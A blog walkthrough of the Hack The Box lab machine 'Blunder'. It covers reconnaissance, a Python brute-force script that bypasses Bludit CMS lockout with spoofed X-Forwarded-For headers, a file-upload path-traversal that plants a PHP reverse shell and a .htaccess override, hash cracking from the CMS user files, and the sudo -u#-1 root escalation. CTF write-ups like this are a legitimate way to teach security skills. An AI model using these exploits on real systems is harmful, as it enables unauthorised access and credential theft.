---
title: 'Blunder Machine HTB'
excerpt: 'This is a write-up for an easy Linux box on hackthebox.eu named Blunder. It is a pretty easy box, on which we have to exploit a Content Management System (CMS) to get the base user and then crack some passwords, which we get from the files in the web directory then we exploit a CVE to get root. Let’s get going.'
coverImage: '/assets/blog/blunder/blunder.jpg'
date: '2021-08-16T05:35:07.322Z'
author:
  name: W0lf15
  picture: '/assets/blog/authors/w0lf15.png'
ogImage:
  url: '/assets/blog/blunder/blunder.jpg'
---

## Recon

As usual, we will start with Nmap, as introduced in the previous blog we will use a script to perform the Nmap scan (please keep in mind the IP address might be different for you). The script first gathers the open ports and then run the scripts for version enumeration and default scripts on the ports, this saves a lot of time for us.

```shell
ports=$(nmap -p- --min-rate=1000 -T4 10.129.28.0| grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports 10.129.28.0
```

Looking at the results,

```shell
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 22:01 EDT
Nmap scan report for 10.129.28.0
Host is up (0.17s latency).
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.55 seconds
```

We can see that a web server is running on port 80. Visiting the page

We can see that there are multiple blogs on the page, while hovering over the blog we can see that hostname is blunder.htb. Let’s add that to our hosts list. We can easily do this by opening up /etc/hosts and adding the entry 10.129.28.0 blunder.htb. This might help some cases.

```shell
sudo vi /etc/hosts
```

Visiting the webserver again on the domain and we see no changes. Now, as we presumed that there might be CMS in use we check the source code.

We can see that there are some directories named bl-themes, bl-kernel. Let’s take the help of google and see if we can find anything linked with the directory name.

Google shows that this is the theme directory for Bludit CMS. After visiting the GitHub page for the CMS we can find that the platform is built on PHP. So, let us run gobuster and see if we can find something interesting. We will look for pages with PHP and txt extension while performing gobuster.

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 20 -o initial.crawl -u http://blunder.htb -x php,txt -b 403,404
```

Looking at the results

```shell
/0 (Status: 200)
/about (Status: 200)
/admin (Status: 301)
/cgi-bin/ (Status: 301)
/install.php (Status: 200)
/LICENSE (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/todo.txt (Status: 200)
```

We see that there is /admin page which leads us to a login page and there is a page called todo.txt which has some tasks listed.

In the todo.txt we can see that there might be a username for a user named fergus. Let’s keep that handy in our notes.
Now, let's do a searchsploit on Bludit CMS and see if there are any unauthenticated vulnerabilities associated with it, which can be exploited.

```shell
searchsploit Bludit
```

We can see that there are multiple vulnerabilities available for the CMS, going through them we can identify that we need access to the admin portal to exploit them. Looking at the first result from searchsploit we can see that there is a burteforce mitigation but that can be bypassed using the X-Forward-For header.

To start let’s generate a wordlist and we will be using this cool tool named cewl. We make the minimum size of the word to be gathered as 8 because that is the minimum length for passwords for most modern applications.

```shell
cewl -m 8 http://blunder.htb > wordlist.txt
```

Now we have our wordlist. Let’s use burp to check if we can perform a bruteforce. Capture the login request and analyze it.

Analyzing Login Request
We can see that there is a CSRF token named tokenCSRF. Let’s check if the token is getting verified or not at the server end. For the initial request sent to the server, we get an HTTP 200 response. If we repeat the request we get an HTTP 301. This means that the CSRF token is getting verified at the server end. For this, we might need to create a script that will collect a valid CSRF token from the server and then send a new token with our request.

Let us create a script to perform the bruteforce. To write this script we need to check what happens if we enter a wrong password and what happens if we enter a correct one. We already know the HTTP Response for the Wrong password is 200. For any other response code we print out the username and password combo used and then check the validity of the username and password. Just providing a snippet of the code, full code can be found in this GitHub <a href="https://github.com/iammainul/htb-scripts/blob/main/bruteforce.py">repository</a>.

```python
 #Grabbing the CSRF Token and Cookie
 r = requests.get(f'http://{HOST}/admin/')
 csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
 #The cookie seemed to be hexadecimal,so we used the [a-f0-9] regex
 csrf = csrf.group(1)
 cookie = r.cookies.get('BLUDIT-KEY')

 #Declaring the X-Forwarded-For Header
 headers = {
   'X-Forwarder-For': f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
 }

 #Post data for login request
 data = {
   'tokenCSRF':csrf,
   'username':user,
   'password':password,
   'save':''
 }
 cookies = {
   ' BLUDIT-KEY': cookie
 }
#Sending the Login Request
 r = requests.post(f'http://{HOST}/admin/login', data=data, cookies=cookies, headers=headers, allow_redirects=False, proxies=PROXY)

 #Chelcs if the password is correct ot not
 if r.status_code !=200:
  print(f"{USER}:{password}")
  return True
 elif "password incorrect" in r.text:
  return False
#Brruteforce
wordlist = open('wordlist.txt').readlines()
for line in wl:
 line=line.strip()
 login ('fergus',line)
```

We run the script and we get a valid credential

```python
fergus:RolandDeschain
```

We try to login to the portal using the credential and voila we get logged in to the admin panel.

Now we can try to exploit the other vulnerabilities and get a shell on the machine.

## Initial Foothold

We have already found that there is an arbitrary file upload vulnerability which can lead to remote code execution. The upload functionality checks for uploaded files on the portal and if the extension doesn't match then the doesn't get uploaded. But the UUID which sets the location is user-controllable and there is no error if we tamper with the data. This allows us to upload the file in any directory of the web application, this leads to remote code execution.
To start, we will copy a shell and name it as shell.jpg. According to the exploits, we found online we need to store our shell in the tmp directory inside the webroot.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Modify the IP and Port parameter in the shell and rename it to shell.jpg, and upload the file. Keep in mind we need to change the UUID to ../../tmp, before we can upload the file.

```bash
mv shell.php shell.jpg
```

After we successfully upload the jpg we also need to update the .htaccess to make the jpg executable as PHP.
For that, we will create a file named htaccess.jpg with the following contents

```bash
RewriteEngine off
AddType application/x-httpd-php .jpg
```

While uploading we will change the filename to .htaccess and change the UUID to ../../tmp.

uploading .htaccess
Now, to get the shell back, we will start Netcat server on the port specified on our shell file and visit the URL http://blunder.htb/bl-content/tmp/shell.jpg

```shell
nc -lnvp 9001
```

Making the shell interactive

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
<press Ctrl+z> to send the shell to background
stty raw -echo
fg <press enter to bring to foreground>
```

## Enumeration

Now we have an interactive shell on the box. Now we need to escalate our privileges to user. To do that we will do a bit enumeration on the box and see what users are there in the box.

```bash
cat /etc/passwd
```

We can see that there is a user named hugo.

Let’s do a bit of digging in the CMS folder and check if it has anything to offer because most of the time flatline CMSs generally store the user credentials in files rather than databases that we can enumerate.

```bash
cd /var/www
ls
```

We see there are two Bludit CMS folders.

We will search for the keyword user in www and see if we get any matches

```shell
find . | grep user
```

We find two locations that say database and have a user.php. Let’s see if we can get something from there.

```shell
cat ./bludit-3.9.2/bl-content/databases/users.php
```

We find two users here, one is for admin and one for the author user role.

Looking at the other file

```shell
cat ./bludit-3.10.0a/bl-content/databases/users.php
```

We find another user with the as user

We gather the hashes for the password and performing a word count we can see it has 40 words, most probably sha1sum. Only the user Hugo doesn't have a slat for the hash, so this should be easy to crack via hashcat.

Create a file named recovery.txt

```txt
admin:faca404fd5c0a31cf1897b823c695c85cffeb98d
```

Running hashcat

```bash
hashcat --username -m 100 recovery.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

After a while, we get the password back as Password120

We can see that a user is already there and we recovered a password. Let’s utilize that to escalate to hugo

```shell
su hugo
```

After entering the password we escalate to hugo

## Privilege Escalation

We are now hugo in the box and let’s check what commands we can run.

```bash
sudo -l
```

Recently a vulnerability was found which leads to sudo access by exploiting (ALL, !root) /bin/bash. Let’s check google for it.

We have this local privilege escalation exploit.

We need to run sudo -u#-1 /bin/bash in our shell and we should be root.

```shell
sudo -u#-1 /bin/bash
```

And we are root.

## Flags

```bash
cat /home/hugo/user.txt
ed3d4ce21c7c160..09eee74296ef
cat /root/root.txt
b1c741506b69db3..3b52e2cca794
```

Hope you like this small write-up on Blunder from hackthebox.

```

```
